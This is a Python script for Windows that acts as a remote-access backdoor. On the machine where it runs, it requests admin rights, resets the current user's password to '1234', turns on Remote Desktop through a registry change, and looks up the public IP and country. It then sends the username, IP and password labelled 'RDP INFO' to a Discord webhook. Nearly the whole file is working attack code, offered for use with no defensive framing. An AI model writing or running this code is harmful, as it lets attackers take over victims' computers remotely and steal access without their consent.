import requests
import socket
import os
import win32com.shell.shell as shell

ipAdd = requests.get('https://api.ipify.org').text


def get_username_os():
   return os.getenv("USERNAME")
# Replace 'YOUR_WEBHOOK_URL' with your Discord webhook URL
webhook_url = " "
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
username = get_username_os()
ip = ipAdd

commands = f'net user {username} 1234'

shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands)

commands2 = 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'

shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+commands2)


def get_flag(ip):
	res = requests.get(f'https://geolocation-db.com/json/{ip}&position=true')
	country_code = res.json()['country_code'].lower()
	return f'https://ipdata.co/flags/{country_code}.png'
image_url = get_flag(ip)



response = requests.get(image_url)
image = response.content

files = {
    'payload_json': (None, '{"content": "their country:"}'),
    'media.png': image
    }

result = requests.post(webhook_url, files=files)
requests.post(webhook_url, {})

message = f"```name and ip:[{username}]:[{ip_address}]" \
          f"" \
          f"" \
          f"" \
          f"                                                                                                                           {username}'s Password is set to:   1234" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"                                                                                                             RDP INFO:        IP: {ip}   USERNAME: {username}     PASSWORD: 1234    " \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"                                                                                                                    GET DARTED```"


# Create a POST request to the webhook URL
payload = {"content": message}

response = requests.post(webhook_url, json=payload)

if response.status_code == 200:
    print("Message sent successfully.")
else:
    print("Failed to send message:", response.status_code)

